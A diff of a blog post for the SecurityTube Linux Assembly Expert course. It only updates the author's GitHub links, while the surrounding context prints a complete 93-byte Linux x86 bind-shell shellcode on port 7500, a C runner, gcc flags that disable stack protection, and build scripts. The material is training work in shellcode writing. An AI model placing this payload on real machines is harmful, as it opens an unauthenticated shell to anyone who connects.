@@ -84,7 +84,7 @@ And below there is the complete shellcode:
 
 	;Description:	Assignment #1 (Shell_Bind_TCP, 93 bytes)
 	;Shellcode:		\x31\xd2\x31\xdb\x6a\x66\x58\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x96\xb0\x66\x43\x52\x66\x68\x1d\x4c\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
-	;Author: 		Paolo Stivanin <https://github.com/polslinux>
+	;Author: 		Paolo Stivanin <https://github.com/paolostivanin>
 	;SLAE ID:		526
 
 	global _start
@@ -175,7 +175,7 @@ After that I used the following script to assemble, link and get the shellcode i
 
 	#!/bin/bash
 
-	#Author:	Paolo Stivanin <https://github.com/polslinux>
+	#Author:	Paolo Stivanin <https://github.com/paolostivanin>
 	#SLAE ID:	526
 
 	if [ -z "$1" ];then
@@ -205,7 +205,7 @@ The output of the script is:
 Before executing the shellcode the above result must be put inside the following C file.
   
 	/* Template for running shellcode
-	* Author: Paolo Stivanin <https://github.com/polslinux>
+	* Author: Paolo Stivanin <https://github.com/paolostivanin>
 	* SLAE Student ID: 526
 	*/
 
@@ -222,7 +222,7 @@ Before executing the shellcode the above result must be put inside the following
 		return 0;
 	}
 
-Now it's time to compile the file with `gcc -fno-stack-protector -z execstack main.c -o Shell_Bind_TCP` (or with [this](https://github.com/polslinux/SLAE/blob/master/utility/for-shellcode/compile_gcc.sh) script) and then run it with `./Shell_Bind_TCP`.
+Now it's time to compile the file with `gcc -fno-stack-protector -z execstack main.c -o Shell_Bind_TCP` (or with [this](https://github.com/paolostivanin/SLAE/blob/master/utility/for-shellcode/compile_gcc.sh) script) and then run it with `./Shell_Bind_TCP`.
 
 To test the shellcode you just need to open a new terminal and type `nc localhost 7500` and...you're in :-)
 
@@ -233,7 +233,7 @@ The last point of this assignment ask to provide a way to easily configure the p
 	#!/bin/bash
 
 	#Description:	Assignment #1 (Shell_Bind_TCP, configure port)
-	#Author: 		Paolo Stivanin <https://github.com/polslinux>
+	#Author: 		Paolo Stivanin <https://github.com/paolostivanin>
 	#SLAE ID:		526
 
 	if [ -z "$1" ]; then
@@ -256,7 +256,7 @@ The last point of this assignment ask to provide a way to easily configure the p
 
 	echo "[+] All done :)"
 
-All the sources can be found in my [Github page](https://github.com/polslinux/SLAE/).
+All the sources can be found in my [Github page](https://github.com/paolostivanin/SLAE/).
 
 
 This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
